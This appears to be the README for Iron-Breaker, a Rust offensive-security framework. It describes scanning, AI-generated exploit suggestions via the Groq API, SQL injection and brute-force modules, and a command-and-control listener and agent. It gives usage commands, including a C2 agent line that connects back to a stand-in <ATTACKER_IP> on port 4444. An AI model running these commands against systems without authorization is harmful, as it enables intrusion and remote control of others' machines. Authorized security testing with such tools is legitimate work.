# 🛡️ Iron-Breaker: Modular Security Suite

> **Version:** 3.0  
> **Author:** sh4lu_z  
> **Language:** Rust 🦀

**Iron-Breaker** is a cutting-edge, offensive security framework designed for speed, stealth, and intelligence. Built entirely in Rust, it leverages asynchronous concurrency to perform high-speed reconnaissance, AI-assisted vulnerability analysis, and post-exploitation tasks.

## 🚀 Key Features

* **🧠 AI-Driven Intelligence:** Uses Groq API to analyze service banners and generate exploits.
* **⚡ High-Performance Scanning:** Async subdomain & deep port scanning (1-65535).
* **🕸️ Web Exploitation:** Modules for SQL Injection & Login Brute-forcing.
* **📡 C2 Architecture:** Native Listener and Agent for Command & Control.
* **🔓 Password Cracking:** Offline hash cracking capabilities.
* **🔄 Proxy Mode:** Intermediate proxy for traffic interception.

---

## 🛠️ Installation

Ensure you have Rust and Cargo installed.

```bash
git clone [https://github.com/sh4lu_z/iron-breaker.git](https://github.com/sh4lu_z/iron-breaker.git)
```
cd iron-breaker
cargo build --release
The binary will be available in target/release/iron-breaker.

📖 Usage
1. Intelligence Scan (Subdomains + AI)
Scans subdomains and uses AI to suggest exploits.

```bash
./iron-breaker scan <TARGET> --groq-key <KEY> --concurrency 100
```
2. Deep Port Scan
```bash
./iron-breaker ports <TARGET_IP> --concurrency 200
```
3. Web Attacks
Runs SQLi checks and brute-force attacks.

```bash
./iron-breaker web <TARGET_URL> --user admin
```
4. Spidering
Crawl a website as a bot.

```bash
./iron-breaker spider <TARGET_URL>
```
5. Command & Control (C2)
Listener:

```bash
./iron-breaker listen --port 4444
```
Agent:

```bash
./iron-breaker c2 --ip <ATTACKER_IP> --port 4444
```

⚠️ Disclaimer

This tool is for educational purposes and authorized security testing only.
Do not use this tool on networks without explicit permission. The author denies responsibility for misuse.
